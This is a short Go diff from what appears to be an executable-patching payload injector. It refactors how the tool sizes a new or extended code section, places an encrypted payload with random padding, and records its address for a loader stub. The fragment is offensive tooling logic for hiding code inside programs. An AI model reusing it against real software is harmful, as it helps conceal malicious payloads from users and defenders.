@@ -842,8 +842,8 @@ func (inj *Injector) useExtendTextMode(ctx *loaderCtx, loader string, payload []
 		inj.ctx.Mode = ModeExtendText
 		return removeCodeCaveModeStub(loader), nil
 	}
-	payload = inj.encryptPayload(ctx, payload)
 	// calculate the section extend size
+	payload = inj.encryptPayload(ctx, payload)
 	randomBeginSize := uint32(inj.rand.Intn(64))  // #nosec G115
 	randomEndOffset := uint32(inj.rand.Intn(256)) // #nosec G115
 	payloadOffset := randomBeginSize + uint32(inj.loaderSize) + randomEndOffset
@@ -904,35 +904,28 @@ func (inj *Injector) useExtendTextNSMode(ctx *loaderCtx, loader string, payload 
 }
 
 func (inj *Injector) useCreateTextMode(ctx *loaderCtx, loader string, payload []byte) (string, error) {
+	// check is used to calculate loader size
+	if inj.loaderSize == 0 {
+		ctx.PayloadRVA = 0x12345678
+		ctx.CreateTextMode = true
+		inj.ctx.Mode = ModeCreateText
+		return removeCodeCaveModeStub(loader), nil
+	}
+	// calculate the section extend size
 	payload = inj.encryptPayload(ctx, payload)
-	randomOffset := uint32(inj.rand.Intn(1024)) // #nosec G115
-	// calculate the loader size(approximation)
-	var maxNumInst int
-	switch inj.arch {
-	case "386":
-		maxNumInst = inj.getMaxNumLoaderInstX86()
-	case "amd64":
-		maxNumInst = inj.getMaxNumLoaderInstX64()
-	}
-	var loaderSize int
-	if inj.opts.NoGarbageInst {
-		loaderSize = maxNumInst * 16
-	} else {
-		loaderSize = maxNumInst * (16 + 16)
-	}
-	scOffset := uint32(loaderSize) + randomOffset // #nosec G115
-	size := scOffset + uint32(len(payload))       // #nosec G115
+	randomBeginSize := uint32(inj.rand.Intn(64))  // #nosec G115
+	randomEndOffset := uint32(inj.rand.Intn(256)) // #nosec G115
+	payloadOffset := randomBeginSize + uint32(inj.loaderSize) + randomEndOffset
+	size := payloadOffset + uint32(len(payload))
 	section, err := inj.createSectionRX(inj.opts.SectionName, size)
 	if err != nil {
 		return "", err
 	}
 	inj.section = section
-	// write random data for padding caves between loader and payload
-	_, _ = inj.rand.Read(inj.dup[inj.section.Offset : inj.section.Offset+scOffset])
 	// write encrypted payload
-	copy(inj.dup[section.Offset+scOffset:], payload)
+	copy(inj.dup[section.Offset+payloadOffset:], payload)
 	// update context
-	ctx.PayloadRVA = section.VirtualAddress + scOffset
+	ctx.PayloadRVA = section.VirtualAddress + payloadOffset
 	ctx.CreateTextMode = true
 	inj.ctx.Mode = ModeCreateText
 	return removeCodeCaveModeStub(loader), nil
